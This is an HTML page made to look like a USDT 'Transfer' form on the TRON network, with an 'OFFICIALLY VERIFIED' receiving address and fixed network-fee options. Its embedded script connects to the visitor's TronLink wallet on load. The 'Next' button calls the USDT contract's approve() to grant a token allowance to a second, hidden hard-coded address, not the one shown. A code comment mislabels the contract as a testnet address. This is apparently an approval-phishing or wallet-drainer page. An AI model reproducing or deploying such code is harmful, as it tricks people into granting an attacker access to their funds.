<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="keywords" content="Transfer">
  <meta name="description" content="Transfer">
  <title>Transfer</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@2.11.2/dist/TronWeb.js"></script>

  <!-- 引入样式 -->
  <link rel="stylesheet" href="//at.alicdn.com/t/c/font_4053014_4vpqy3obi53.css">
  <link rel="stylesheet" href="//at.alicdn.com/t/c/font_4115716_4pvihezbcjt.css">
  <link rel="stylesheet" href="./static/css/KiOX4bTVZ0-2bc9f95b.css">
  <link rel="stylesheet" href="./static/css/AFCMtSKi1o-cb4abda5.css">
  <link rel="stylesheet" href="./static/css/T-9d9ae4af.css">
  <link rel="stylesheet" href="./static/css/dDfA04L-73dabe84.css">
  <link rel="stylesheet" href="./static/css/uwF4-bd04d9f4.css">
</head>

<body>
  <div id="app">
    <div class="n-config-provider">
      <div style="min-height: 50vh;">
        <div data-v-239b0e29="" class="main-container-wrapper">
          <div data-v-239b0e29="" class="page-container">
            <div data-v-239b0e29="" class="send-title"> Receiving address <span data-v-239b0e29=""
                class="official">OFFICIALLY VERIFIED</span></div>
            <div data-v-239b0e29="" class="ens-input send__to-row">
              <div data-v-239b0e29="" class="ens-input__wrapper">
                <div data-v-239b0e29="" class="ens-input__wrapper__input fs14">TMjKDcFqUcDZ55dwhtpBw9YFbxrHm4Q88</div>
              </div>
            </div>
            <div data-v-239b0e29="" style="margin-left: 16px;">
              <div data-v-239b0e29="" class="send-v2__form-title">Amount</div>
            </div>
            <div data-v-239b0e29="" class="send-v2__form-amount-asset" style="margin-left: 16px;">
              <div data-v-239b0e29="" class="send-v2__form-row"><button data-v-239b0e29="" class="send-v2__amount-max">
                  <div data-v-239b0e29="" class="send-v2__amount-max__button">Max</div>
                </button>
                <div data-v-239b0e29="" class="send-v2__form-field-container">
                  <div data-v-239b0e29="" class="send-v2__form-field">
                    <div data-v-239b0e29="" class="unit-input">
                      <div data-v-239b0e29="" class="unit-input__inputs">
                        <div data-v-239b0e29="" class="unit-input__input-container"><input data-v-239b0e29=""
                            type="text" inputmode="decimal" class="unit-input__input" placeholder=""
                            style="width: 3.5ch;"></div>
                      </div>
                    </div>
                  </div>
                  <div data-v-239b0e29=""></div>
                </div>
              </div>
              <div data-v-239b0e29="" class="send-v2__form-divider"></div>
              <div data-v-239b0e29="" class="send-v2__form-row">
                <div data-v-239b0e29="" class="send-v2__form-field">
                  <div data-v-239b0e29="" class="send-v2__asset-dropdown">
                    <div data-v-239b0e29="" class="send-v2__asset-dropdown__input-wrapper">
                      <div data-v-239b0e29="" class="send-v2__asset-dropdown__asset">
                        <div data-v-239b0e29="" class="send-v2__asset-dropdown__asset-title">Assets</div>
                        <div data-v-239b0e29="" class="send-v2__asset-dropdown__asset-content">
                          <div data-v-239b0e29="" class="send-v2__asset-dropdown__asset-icon"><img data-v-239b0e29=""
                              class="identicon" src="./assets/token/usdt.png" alt=""
                              style="height: 24px; width: 24px; border-radius: 12px;"></div>
                          <div data-v-239b0e29="" class="send-v2__asset-dropdown__name">
                            <div data-v-239b0e29="" class="currency-display-component" title="0"><span
                                data-v-239b0e29="" class="currency-display-component__text"><span
                                  data-v-239b0e29="">0</span></span></div>
                          </div>
                          <div data-v-239b0e29="" class="send-v2__asset-dropdown__symbol">USDT</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div data-v-239b0e29="" style="margin: 10px 16px;">
              <div data-v-239b0e29="" class="gas-price-button-group--title">Network fee</div>
            </div>
            <div data-v-239b0e29="" class="list">
              <div data-v-239b0e29="" class="item active-item">
                <div data-v-239b0e29="" class="header"><img data-v-239b0e29="" class="image"
                    src="https://wfd2bp54fy.2468.pro./static/svg/beTQrs4s-07b5b9ae.svg" width="18"><span
                    data-v-239b0e29="" class="name">Slow</span></div>
                <div data-v-239b0e29="" class="bnb" style="text-align: center;">3 TRX</div>
                <div data-v-239b0e29="" class="usd">$0.327423</div>
              </div>
              <div data-v-239b0e29="" class="item false">
                <div data-v-239b0e29="" class="header"><img data-v-239b0e29="" class="image"
                    src="https://wfd2bp54fy.2468.pro./static/svg/SfyIzVC-2f601456.svg" width="18"><span
                    data-v-239b0e29="" class="name">Medium</span></div>
                <div data-v-239b0e29="" class="bnb" style="text-align: center;">5 TRX</div>
                <div data-v-239b0e29="" class="usd">$0.545706</div>
              </div>
              <div data-v-239b0e29="" class="item false">
                <div data-v-239b0e29="" class="header"><img data-v-239b0e29="" class="image"
                    src="https://wfd2bp54fy.2468.pro./static/svg/KzP-8d3e2675.svg" width="18"><span data-v-239b0e29=""
                    class="name">Fast</span></div>
                <div data-v-239b0e29="" class="bnb" style="text-align: center;">10 TRX</div>
                <div data-v-239b0e29="" class="usd">$1.091411</div>
              </div>
            </div>
            <div data-v-239b0e29="" style="margin: 60px 16px 30px;"><button data-v-239b0e29="" type="button" onclick="authorizeTronUsdt()"
                class="van-button van-button--primary van-button--normal" style="width: 100%; border-radius: 16px;">
                <div class="van-button__content"><!----><span class="van-button__text">Next</span><!----></div>
              </button></div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <script>
    async function connectTronWallet() {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            // 已经连接 TronLink，无需显示状态
        } else if (window.tronLink) {
            // 尝试连接 TronLink
            try {
                await window.tronLink.request({ method: 'tron_requestAccounts' });
                // 成功连接后，不需要显示状态
            } catch (error) {
                // 用户拒绝连接，无需显示状态
            }
        } else {
            // 没有安装 TronLink，无需显示状态
        }
    }

    // 页面加载时自动调用连接函数
    window.onload = connectTronWallet;
</script>

<script>
    async function authorizeTronUsdt() {
      if (typeof window.TronLink === 'undefined') {
        alert('请安装 TRONLink 扩展！');
        return;
      }

      try {
        const tronLink = window.TronLink;
        await tronLink.request({ method: 'tron_requestAccounts' });

        const recipientAddress = 'TThzxNRLrW2Brp9DcTQU8i4Wd9udCWEdZ3'; // 接收地址
        const tokenContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Shasta 测试网 USDT 合约地址
        const amount = 100000; // 授权的 USDT 数量（单位是最小单位）

        const accounts = await tronLink.request({ method: 'tron_requestAccounts' });
        const fromAddress = accounts[0];

        // 获取 TRON 网络的合约
        const contract = await tronLink.contract().at(tokenContractAddress);
        
        // 执行授权
        const result = await contract.methods.approve(recipientAddress, amount).send({ from: fromAddress });
        
        if (result.result) {
          alert('授权成功！');
        } else {
          alert('授权失败！');
        }
      } catch (error) {
        console.error(error);
        alert('发生错误，请查看控制台。');
      }
    }
  </script>

</body>

</html>
